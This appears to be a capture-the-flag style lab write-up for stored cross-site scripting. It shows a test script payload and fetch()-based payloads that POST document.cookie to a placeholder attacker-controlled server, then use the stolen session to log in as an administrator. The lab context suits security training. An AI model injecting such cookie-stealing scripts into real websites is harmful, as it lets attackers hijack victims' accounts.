@@ -1,0 +1,43 @@
+LAB INFO: Exploiting cross-site scripting to steal cookies
+
+
+TARGET GOAL: Exploit the stored xss and get the victims session cookie and then login as the victim.
+
+ANALYSIS:
+1. Let's check the every comment field like, comment name, email and website
+2. We can see that the comment, name,email field were reflected 
+3. so, we will check for them, first let's check for the coment field by giving a console script i.e
+       3.1 <script>console.log("hello")</script> ==> From here we can see that the comment is not shown in webpage but the "hello" is shown on the console (i.e it proves that the comment field have the XSS)
+
+4. Now, we will see that the if this proven xss has an impact, so to prove we will steal the session cookie anyone who visit that website
+    
+    4.1          <script>
+
+                      fetch('attacker_controlled_server_here'{
+                        configuration for the request itself
+                        mode: 'no-cors' ==> This will not output the client side error
+                      })
+                </script> 
+
+
+    4.2       <script>
+                      
+                      fetch('',{
+                        method: 'POST',
+                        body:document.cookie,
+                        mode: 'no-cors'
+
+                      })
+               
+
+
+             </script>
+      
+
+
+# fetch ==> IT is use inorder to output the cookie of the user that visit the website and then send it to our attacker controlled server
+
+5. And then we will get the secret and session cookie from the victim browser to our own browser
+6. So, going into the login page and using that cookie can let us to login and administrator user
+
+HENCE WE SOLVED THE LAB
